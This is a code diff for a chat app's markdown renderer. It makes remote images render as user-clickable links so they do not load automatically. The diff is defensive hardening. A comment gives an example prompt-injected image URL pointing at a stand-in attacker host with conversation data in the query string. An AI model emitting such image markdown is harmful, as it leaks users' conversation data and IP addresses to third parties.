@@ -3,7 +3,7 @@ import ReactMarkdown, { type Components, type Options, type UrlTransform } from 
 import remarkGfm from 'remark-gfm'
 import remarkMath from 'remark-math'
 import rehypeKatex from 'rehype-katex'
-import { Check, Copy, Download, Play } from 'lucide-react'
+import { Check, Copy, Download, ImageIcon, Play } from 'lucide-react'
 import { normalizeMathDelimiters, unwrapBoxedMinipages } from '@pulpo/client-core'
 import 'katex/dist/katex.min.css'
 import { HighlightedCode } from '@/components/chat/HighlightedCode'
@@ -66,6 +66,35 @@ function CodeBlock({ language, code, caret }: { language: string; code: string; 
   )
 }
 
+function imageHost(src: string): string | null {
+  try {
+    return new URL(src, window.location.href).host
+  } catch {
+    return null
+  }
+}
+
+// Remote images load without a click, so a prompt-injected `![](https://attacker/?d=...)` would
+// leak conversation data and the user's IP. Render them as links the user can choose to open.
+function MarkdownImage({ src, alt }: ComponentProps<'img'>) {
+  const href = typeof src === 'string' ? src : ''
+  if (!href) return alt ? <>{alt}</> : null
+  const host = imageHost(href)
+  return (
+    <a
+      href={href}
+      target="_blank"
+      rel="noopener noreferrer"
+      title={href}
+      className="inline-flex max-w-full items-center gap-1 rounded-md border bg-muted/50 px-1.5 py-0.5 align-baseline text-[0.9em] no-underline hover:bg-muted"
+    >
+      <ImageIcon className="size-3.5 shrink-0 text-muted-foreground" aria-hidden="true" />
+      <span className="min-w-0 truncate">{alt || ui("Image")}</span>
+      {host && <span className="shrink-0 text-muted-foreground">· {host}</span>}
+    </a>
+  )
+}
+
 // Stable renderer identities preserve DOM nodes and in-progress interactions during streaming.
 const markdownComponents: Components = {
   pre: ({ children }) => <>{children}</>,
@@ -125,6 +154,7 @@ const markdownComponents: Components = {
   td: ({ children }) => <td className="border-b px-3 py-2">{children}</td>,
   hr: () => <hr className="my-4 border-border" />,
   strong: ({ children }) => <strong className="font-semibold">{children}</strong>,
+  img: MarkdownImage,
 }
 
 const REHYPE_PLUGINS: NonNullable<Options['rehypePlugins']> = [
